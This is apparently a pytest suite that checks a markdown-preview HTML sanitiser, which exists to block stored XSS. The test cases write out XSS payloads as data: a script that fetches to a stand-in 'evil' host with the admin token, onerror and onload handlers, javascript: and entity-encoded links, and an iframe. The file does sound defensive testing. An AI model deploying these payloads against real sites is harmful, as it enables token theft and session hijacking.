"""What the document editor's markdown preview puts in the page (WEB-3).

A note is data. Markdown allows raw HTML, so ``marked``'s output is
whatever the note's author typed — and the preview renders it inside the
dashboard's own page, where the admin token lives in memory. These cases
run the REAL pipeline the editor runs (the vendored ``marked``, then
``web/static/sanitize_html.js``, via
``domovoi/tests/markdown_preview_harness.js``) and assert on the exact
string the preview would hand to the DOM.

No DB, no ``requires_db`` — never skips. Needs ``node`` (the runtime the
JSX compile check already relies on) and fails, not skips, without it.
"""

from __future__ import annotations

import json
import re
import shutil
import subprocess
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[2]
HARNESS = Path(__file__).with_name("markdown_preview_harness.js")

ON_HANDLER = re.compile(r"\son[a-z]+\s*=", re.IGNORECASE)

CASES = {
    # The two shapes the finding named.
    "img_onerror": {"markdown": '<img src=x onerror="alert(document.cookie)">\n'},
    "script": {"markdown": "# notes\n\n<script>fetch('http://evil/'+Auth.token)</script>\n"},
    # A link whose href executes, and one that spells the scheme with
    # entities so a naive string check misses it.
    "javascript_link": {"markdown": "[click](javascript:alert(1))\n"},
    "entity_scheme": {"html": '<a href="java&#115;cript:alert(1)">click</a>'},
    "svg_onload": {"html": '<svg onload="alert(1)"><circle r="1"/></svg>'},
    "iframe": {"html": '<iframe src="http://evil/"></iframe>'},
    "body_onload": {"html": '<body onload=alert(1)>hi</body>'},
    "unquoted_handler": {"html": "<div onmouseover=alert(1)>hover</div>"},
    "svg_data_image": {"html": '<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">'},
    # And the ordinary note, which must still render as a note.
    "ordinary": {
        "markdown": (
            "# Shopping\n\n"
            "Milk **and** eggs, see [the list](https://example.com/list).\n\n"
            "- one\n- two\n\n"
            "```python\nprint('hi')\n```\n\n"
            "| a | b |\n|---|---|\n| 1 | 2 |\n\n"
            "![photo](/api/images/raw?library_id=core%3Apictures&path=x.png)\n"
        )
    },
}


@pytest.fixture(scope="module")
def previews() -> dict:
    node = shutil.which("node")
    assert node, "node is required to render the markdown preview (see jsxcheck)"
    proc = subprocess.run(
        [node, str(HARNESS), str(REPO_ROOT), json.dumps(CASES)],
        capture_output=True, text=True, encoding="utf-8", timeout=120,
    )
    assert proc.returncode == 0, proc.stderr
    return json.loads(proc.stdout)


def test_the_harness_really_renders_the_dangerous_input(previews) -> None:
    """Guard against a vacuous pass: the UNSANITISED output of the two
    cases the finding named does carry the payload, so the assertions
    below are about the sanitiser and not about marked quietly dropping
    things."""
    assert "onerror" in previews["img_onerror"]["raw"]
    assert "<script" in previews["script"]["raw"]


@pytest.mark.parametrize("case", sorted(CASES))
def test_no_preview_carries_a_script_element_or_an_event_handler(previews, case) -> None:
    html = previews[case]["sanitized"]
    assert "<script" not in html.lower()
    assert not ON_HANDLER.search(html), html


@pytest.mark.parametrize("case", sorted(CASES))
def test_no_preview_carries_an_executable_url(previews, case) -> None:
    html = previews[case]["sanitized"].lower()
    assert "javascript:" not in html
    assert "data:text/html" not in html
    assert "data:image/svg" not in html


def test_an_image_with_a_handler_survives_as_a_plain_image(previews) -> None:
    """The picture is still shown — only the handler is gone. Sanitising
    by deleting the whole element would make the editor useless for the
    notes people actually write."""
    html = previews["img_onerror"]["sanitized"]
    assert "<img" in html and 'src="x"' in html


def test_an_ordinary_note_still_renders_as_a_note(previews) -> None:
    html = previews["ordinary"]["sanitized"]
    for fragment in ("<h1", "<strong>", "<ul>", "<li>", "<code", "<table>", "<td>"):
        assert fragment in html, f"{fragment} missing from {html}"
    # The link keeps its destination and gains the safe rel; the image
    # keeps the library URL it points at.
    assert 'href="https://example.com/list"' in html
    assert 'rel="noopener noreferrer nofollow"' in html
    assert "/api/images/raw?library_id=core%3Apictures&amp;path=x.png" in html


def test_a_dropped_element_keeps_the_text_a_person_wrote(previews) -> None:
    """An unknown or unsafe WRAPPER goes; the words inside it stay, so a
    note that used a tag we don't allow still reads correctly."""
    assert "hi" in previews["body_onload"]["sanitized"]
    assert "hover" in previews["unquoted_handler"]["sanitized"]


def test_a_script_takes_its_contents_with_it(previews) -> None:
    """Dropping the tag but keeping the body would leave the payload in
    the page as text — and one nested quote away from running."""
    assert "fetch(" not in previews["script"]["sanitized"]
    assert "<h1" in previews["script"]["sanitized"]  # the rest of the note survives
